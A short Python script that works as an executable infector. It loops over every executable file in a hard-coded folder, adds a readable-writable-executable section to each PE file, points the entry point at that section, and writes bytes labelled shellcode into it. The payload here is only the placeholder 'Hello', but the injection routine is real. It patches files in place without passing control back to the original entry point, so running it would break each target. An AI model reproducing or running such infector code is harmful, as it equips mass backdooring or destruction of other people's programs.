import mmap
import os
import stat
import pefile

fpath = "D:/Documents/folder/"


def find_exec(fpath):
    # Search of executable file in folder
    executable = stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH
    ls_files = []
    for filename in os.listdir(fpath):
        if os.path.isfile(fpath + filename):
            st = os.stat(fpath + filename)
            mode = st.st_mode
            if mode & executable:
                ls_files.append(filename)
    return ls_files


def align(val_to_align, alignment):
    if val_to_align % alignment:
        val_to_align = ((val_to_align + alignment) // alignment) * alignment
    return val_to_align


def inject(exe_path):
    print("Path to Target.exe: " + exe_path + "\n")

    print("[*] STEP 0x01 - Resize the Executable ")
    print("\tOriginal size: {0} byte".format(os.path.getsize(exe_path)))
    fd = open(exe_path, 'a+b')
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(os.path.getsize(exe_path) + 0x2000)
    map.close()
    fd.close()

    print("\tNew size: {0} byte\n".format(os.path.getsize(exe_path)))

    print("[*] STEP 0x02 - Add the New Section Header")
    pe = pefile.PE(exe_path)
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment

    # Look for valid values for the new section header
    raw_size = align(0x1000, file_alignment)
    virtual_size = align(0x1000, section_alignment)
    raw_offset = align((pe.sections[-1].PointerToRawData +
                        pe.sections[-1].SizeOfRawData),
                       file_alignment)

    virtual_offset = align((pe.sections[-1].VirtualAddress +
                            pe.sections[-1].Misc_VirtualSize),
                           section_alignment)

    characteristics = 0xE0000020
    name = b".test" + (3 * b'\x00')
    new_section_offset = (pe.sections[-1].get_file_offset() + 40)

    # Create the section
    # Set the name
    pe.set_bytes_at_offset(new_section_offset, name)
    print("\t[+] Section Name = %s" % name)
    # Set the virtual size
    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
    print("\t[+] Virtual Size = %s" % hex(virtual_size))
    # Set the virtual offset
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    print("\t[+] Virtual Offset = %s" % hex(virtual_offset))
    # Set the raw size
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    print("\t[+] Raw Size = %s" % hex(raw_size))
    # Set the raw offset
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    print("\t[+] Raw Offset = %s" % hex(raw_offset))
    # Set the following fields to zero
    pe.set_bytes_at_offset(new_section_offset + 24, (12 * b'\x00'))
    # Set the characteristics
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)
    print("\t[+] Characteristics = %s\n" % hex(characteristics))

    print("[*] STEP 0x03 - Modify the Main Headers")
    pe.FILE_HEADER.NumberOfSections += 1
    print("[+] Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections)
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
    print("[+] Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage)
    pe.write(exe_path)

    pe = pefile.PE(exe_path)
    new_ep = pe.sections[-1].VirtualAddress
    print("\t[+] New Entry Point = %s" % hex(pe.sections[-1].VirtualAddress))
    oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    print("\t[+] Original Entry Point = %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

    print("[*] STEP 0x04 - Inject the Shellcode in the New Section")
    shellcode = bytes(b"Hello")

    raw_offset = pe.sections[-1].PointerToRawData
    pe.set_bytes_at_offset(raw_offset, shellcode)
    print("\t[+] Shellcode wrote in the new section")
    pe.write(exe_path)


for file in find_exec(fpath):
    inject(fpath + file)
